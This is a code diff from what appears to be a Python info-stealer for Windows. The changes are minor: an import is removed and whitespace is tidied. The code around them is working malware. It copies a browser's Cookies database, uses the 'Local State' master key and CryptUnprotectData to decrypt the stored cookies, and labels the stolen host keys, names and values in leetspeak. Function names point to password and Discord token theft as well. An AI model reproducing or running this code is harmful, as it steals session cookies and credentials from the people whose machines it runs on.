@@ -9,7 +9,6 @@ from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_
 from urllib.request import Request, urlopen
 from json import loads, dumps
 import time
-import win32crypt
 import shutil
 from zipfile import ZipFile
 import random
@@ -511,28 +510,27 @@ def getPassw(path, arg):
             PasswCount += 1
     writeforfile(Passw, 'passw')
 
-
 Cookies = []    
 def getCookie(path, arg):
     global Cookies, CookiCount
     if not os.path.exists(path): return
-
+    
     pathC = path + arg + "/Cookies"
     if os.stat(pathC).st_size == 0: return
-
+    
     tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
-
+    
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
     cursor = conn.cursor()
-    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies;")
+    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
     data = cursor.fetchall()
     cursor.close()
     conn.close()
     os.remove(tempfold)
 
     pathKey = path + "/Local State"
-
+    
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
@@ -549,7 +547,7 @@ def getCookie(path, arg):
             Cookies.append(f"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}")
             CookiCount += 1
     writeforfile(Cookies, 'cook')
-    
+
 def GetDiscord(path, arg):
     if not os.path.exists(f"{path}/Local State"): return
 
